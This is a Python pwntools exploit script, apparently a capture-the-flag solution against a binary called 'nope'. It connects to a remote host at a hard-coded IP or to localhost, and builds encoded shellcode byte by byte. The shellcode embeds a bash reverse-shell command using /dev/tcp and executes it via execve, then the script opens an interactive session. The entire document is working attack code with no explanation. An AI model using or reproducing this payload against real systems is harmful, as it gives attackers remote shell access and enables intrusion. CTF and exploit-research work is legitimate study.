#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('35.198.126.67', 4444)
else:
    r = remote('127.0.0.1', 4444)

code = ELF('./nope')
context.arch = code.arch
context.log_level = 'debug'

padd = '\x54\x58\x91\x01'
p = '\x54\x58\x2c'
p = ('\x04'*1+
    '\x50'+ # push rax
    '\x5a'+ # pop rdx
    '\x51'+ # push rcx
    padd+
    '')
    
p = ''
al = 0
#p = '\x54\x5f' # push rsp, pop rdi
def wb(byte, write=True):
    global al, p
    while (al & 0xff) != (byte & 0xff):
        al += 0x91
        al &= 0xff
        p += '\xf9\x14'
    p += '\xaa' if write == True else ''

'''
for c in p32(0xdeadbeef):
    wb(ord(c))
'''
wb(0xe7, False)
p += '\x51' # push rcx
p += '\x5f' # pop rdi
p += '\x90'*7
p += '\xae' # scas
p += '\x75' # loop
# rdi -> syscall

p += '\x57' # push rdi
p += '\x5d' # pop rbp = rdi = syscall

p += '\x53' * 0x40 # push rbx for space
p += '\x54' # push rsp 
p += '\x5f' # pop rdi -> str
for i in 'exec 9<> /dev/tcp/127.0.0.1/13337;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;':
    wb(ord(i))
p += '\x54' # push rsp 
p += '\x59' # pop rcx

p += '\x53' * 0x10 # push rbx for space
p += '\x54' # push rsp 
p += '\x5f' # pop rdi
for i in '-c':
    wb(ord(i))
p += '\x54' # push rsp 
p += '\x5a' # pop rdx

p += '\x53' * 0x10 # push rbx for space
p += '\x54' # push rsp 
p += '\x5f' # pop rdi
for i in '/bin/bash':
    wb(ord(i))
p += '\x54' # push rsp 
p += '\x5f' # pop rdi

p += '\x53' * 0x10 # push rbx for space
p += '\x51' # push rcx
p += '\x52' # push rdx
p += '\x57' # push rdi
p += '\x54' # push rsp 
p += '\x5e' # pop rsi

wb(0x3b, False) # syscall number 
p += '\x53'
p += '\x5a'
p += '\x55'
p += '\x55'
p += '\xc3'

r.sendline(p)
raw_input('#')
r.shutdown('write')


r.interactive()
